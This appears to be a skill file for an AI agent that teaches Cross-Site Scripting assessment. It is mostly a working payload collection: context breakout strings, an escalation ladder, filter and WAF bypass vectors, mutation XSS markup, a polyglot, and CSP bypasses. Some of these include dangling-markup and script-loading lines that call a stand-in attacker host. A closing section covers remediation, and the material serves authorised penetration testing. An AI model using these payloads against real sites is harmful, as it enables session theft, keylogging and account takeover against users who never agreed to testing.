---
name: xss
description: Master Cross-Site Scripting (XSS) assessment framework covering reflected, stored, DOM-based, and mutation XSS through context-aware payload ladders, filter bypass cheatsheets, CSP nonce abuse, and WAF evasion techniques for detection and exploitation.
---

# Cross-Site Scripting (XSS) Master Framework

This skill provides the complete methodology for discovering, classifying, and exploiting Cross-Site Scripting across reflected, stored, DOM-based, and mutation variants. It covers context-aware breakout construction, canonical payload escalation ladders, filter and WAF bypass techniques, stored sink hunting, and Content Security Policy evaluation.

## When to use this skill

- Any endpoint reflects untrusted input into HTML responses through query parameters, POST bodies, HTTP headers, or error messages.
- User-supplied content persists server-side and renders back to other users across profiles, comments, markdown renderers, filenames, or HTML emails.
- Client-side JavaScript writes attacker-controllable data into the DOM through `innerHTML`, `document.write`, or template interpolation.
- Sanitization libraries (DOMPurify, sanitize-html, bleach), output encoders, or CSP headers require effectiveness validation against mutation and obfuscation vectors.
- A WAF or custom filter blocks obvious payloads and context-specific evasion ladders are required to prove execution.

## Methodology

### 1. Classify the XSS variant before crafting payloads

Determine the data flow first because it dictates where payloads must land and who observes execution:

- **Reflected XSS**: input travels from the request into the current HTTP response without persistence; exploit delivery relies on crafted links or form auto-submission.
- **Stored XSS**: input persists in a database or filesystem and executes for every user rendering the contaminated resource; prioritize privileged victim roles such as administrators.
- **DOM-based XSS**: source-to-sink flow completes entirely client-side (`location.hash`, `postMessage`, `localStorage`) and never appears in server logs; test inside the browser with DevTools breakpoints.
- **Mutation XSS (mXSS)**: markup that appears inert at parse time mutates into executable form when re-parsed by `innerHTML` after sanitization; test by round-tripping payloads through the application's own sanitizer pipeline.

### 2. Map the injection context with a canary probe

Inject the canary `'"><()` into every candidate parameter and inspect exactly which characters survive in the response source. The surviving character set determines the breakout strategy:

- **HTML body context** (`<div>INPUT</div>`): direct tag injection succeeds; no breakout characters are required beyond `<`.
- **Double-quoted attribute** (`value="INPUT"`): break out with `" onfocus=alert(1) autofocus="` or escape the tag entirely with `"><svg onload=alert(1)>`.
- **Single-quoted attribute** (`value='INPUT'`): break out with `' onmouseover='alert(1)` and rely on user interaction or attach `autofocus`.
- **Unquoted attribute** (`value=INPUT`): a single space introduces new attributes directly: `onfocus=alert(1) autofocus`.
- **JavaScript string context** (`var x = 'INPUT';`): terminate with `';alert(1)//` or `-alert(1)-'`; when backslashes are escaped as `\'`, neutralize them with `\\';alert(1)//`.
- **URL context** (`href="INPUT"`): inject `javascript:alert(1)`; when scheme filters apply, use tab-entity obfuscation `jav&#x09;ascript:alert(1)` or permitted `data:text/html` URIs.
- **CSS context** (`<style>INPUT</style>`): terminate the style block with `</style><img src=x onerror=alert(1)>`; inside inline styles abuse animation event handlers described in step 3.

### 3. Escalate through the canonical payload ladder

Begin with the simplest vector and escalate rung by rung as filters reject each attempt:

```html
<script>alert(1)</script>
"><svg onload=alert(1)>
<img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<details open ontoggle=alert(1)>
<style>@keyframes x{}</style><a style="animation-name:x" onanimationstart=alert(1)>
```

The first rung tests raw script execution; blocking of `<script>` forces event-handler vectors such as `<svg onload>`; blocking of `svg` forces `<img onerror>`; aggressive tag allowlists fall to `<animate onbegin>` because SVG animation elements evade naive regexes; `<details open ontoggle>` fires without user interaction on otherwise-benign tags; the final rung uses CSS animation events (`onanimationstart`, `onanimationiteration`) which execute on elements no tag-based filter considers dangerous because no JavaScript-named attribute appears until runtime style resolution.

### 4. Apply the filter bypass cheatsheet

Deploy these evasion classes against regex-based filters and WAFs:

- **Case variation**: `<ScRiPt>alert(1)</ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>` defeats case-sensitive matching since HTML parsing is case-insensitive.
- **Unclosed tags**: `<img src=x onerror=alert(1)//` executes because browsers auto-close tags at end of document or attribute parsing boundaries.
- **Nested tag splitting**: `<scr<script>ipt>alert(1)</scr</script>ipt>` causes filters that strip one `<script>` occurrence to leave a valid remaining tag after removal.
- **Encoding tricks**: HTML entities inside attribute values (`&#x6a;avascript:`), JS unicode escapes inside string contexts (`\u0061lert(1)`), hex escapes (`\x61lert`), and double URL encoding against decode-once pipelines.
- **CSP nonce reuse**: scrape the per-response nonce through injected CSS exfiltration or dangling markup (`<meta charset="utf8"><img src="//attacker.tld/?leak=`), then replay it in an injected `<script nonce="LEAKED" src="//attacker.tld/x.js">`; nonces that rotate per request but leak via cached pages or parallel responses remain exploitable.
- **mXSS via innerHTML namespace confusion**: sanitizer parsers run with scripting disabled so `<noscript>` content parses as raw text while live browsers parse it as elements:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
```

Foreign-content confusion produces equivalent mutations inside SVG/MathML contexts such as `<svg><style>&lt;img src=x onerror=alert(1)&gt;</style></svg>` where entity decoding happens after namespace re-parsing.

### 5. Hunt stored sinks systematically

Enumerate every field that persists state and revisit every surface that renders it:

- Profile fields: first name, last name, display name, bio, organization, phone number; short fields still accept event-handler attributes under twenty characters.
- Markdown renderers: test whether raw HTML passes through unescaped inside fenced blocks, inline HTML directives, or link reference definitions.
- File names rendered in upload listings: `x"><img src=x onerror=alert(1)>.png` executes when administrators browse the media library.
- EXIF/IPTC metadata (Title, Artist, Copyright) rendered by gallery software that trusts image metadata.
- HTML email bodies viewed in integrated webmail clients where template engines skip sanitization for "trusted" sender domains.
- Logged HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`) rendered inside internal audit dashboards consumed by support staff.

Store a unique canary per field during injection so delayed rendering surfaces map back to their exact origin parameter during triage.

### 6. Deploy a polyglot probe for rapid surface mapping

Fire this single string across all parameters before investing in context-specific payloads:

```javascript
jaVasCript:-/*</title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

The polyglot simultaneously terminates title, style, textarea, script, and xmp contexts while firing an SVG onload handler across heterogeneous templates; any execution narrows the candidate contexts to a handful requiring only targeted refinement afterward.

### 7. Evaluate CSP weaknesses and script gadgets

Read the `Content-Security-Policy` header on every affected endpoint before declaring exploitation impossible:

- `'unsafe-inline'`, `'unsafe-eval'`, or missing `script-src` restore direct injection immediately.
- Allowlisted JSONP endpoints become script gadgets: `<script src="/api/users?callback=alert(1)">`.
- Missing `base-uri` permits hijacking relative script sources:

```html
<base href="https://attacker.tld/">
```

- Legacy AngularJS on an allowlisted origin enables template sandbox escape:

```html
<script src="https://cdn.allowlisted.tld/angularjs/1.6.0/angular.min.js"></script><div ng-app>{{$on.constructor('alert(1)')()}}</div>
```

## Tooling

- Dalfox — fast parameter analysis and XSS scanning with built-in payload generation and headless verification.
- XSStrike — context-aware payload generation with WAF detection and fuzzing engine.
- Burp Suite Intruder + Gf (`gf xss`) — bulk reflection discovery across large parameter sets using curated patterns.
- DOM Invader (Burp browser extension) — automated DOM source-to-sink tracing with canary injection into postMessage flows.
- PortSwigger XSS Cheat Sheet + PayloadsAllTheThings — canonical vector reference organized by context and filter behavior.
- BeEF / XSS Hunter Express — hook deployment and callback collection for demonstrating real-world impact.
- CSP Evaluator (Google) — static analysis of Content-Security-Policy misconfigurations including nonce and allowlist weaknesses.

## Remediation & Secure Architecture

1. **Enforce context-aware output encoding at render time**: HTML entity encoding for body context (`&lt;`, `&gt;`, `&amp;`, `&quot;`), attribute-aware encoding for quoted values including single quotes (`&#x27;`), JavaScript hex/unicode escaping inside string literals (`\x3c`), and strict URL scheme allowlisting for href/src contexts (`http:`, `https:` only).
2. **Rely on framework auto-escaping**: modern template engines (React JSX, Angular templates, Vue mustache interpolation) encode by default; prohibit escape hatches such as `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, and Rails `html_safe` except through reviewed sanitization wrappers.
3. **Sanitize rich HTML server-side**: configure DOMPurify (Node/browser), OWASP Java HTML Sanitizer, or nh3/bleach (Python) with strict allowlists forbidding event-handler attributes entirely rather than blacklisting tags.
4. **Deploy hardened CSP without inline trust**:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0mPerRequest'; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script';
```

5. **Protect session material**: set `HttpOnly`, `Secure`, and `SameSite=Strict` flags on session cookies so stolen execution cannot trivially exfiltrate authentication material; pair with short session lifetimes to limit post-exploitation windows.

**Deliverables**

- Findings table mapping each injection point to its context type (body/attribute/JS/URL/CSS), classification (reflected/stored/DOM/mXSS), executing payload rung from the ladder, affected user roles, and severity rating.
- PoC scripts containing working proof URLs per finding plus callback collector logs demonstrating execution against real victim sessions rather than self-XSS only.
- Remediation matrix listing every vulnerable sink alongside its required control (encoder type per context / sanitizer configuration / CSP directive / cookie flags) with retest verification status per item.

## Verification & Deliverables
A complete engagement run of this skill produces:
- Context matrix of every reflection/storage sink with its encoding context and working breakout payload.
- Proof of execution, not reflection: screenshot or recording of `alert(document.domain)`/`console.log` firing in a victim-equivalent browser session.
- CSP, sanitizer, and WAF analysis including the bypass chain used (if any).
- Impact escalation demonstrated where applicable (session theft, on-behalf actions, keylogging).
- Remediation: per-context output encoding, auto-escaping, sanitizer allowlist, CSP proposal — re-tested with original payloads blocked.
If any artifact is missing, the test is incomplete — return to the corresponding methodology step.
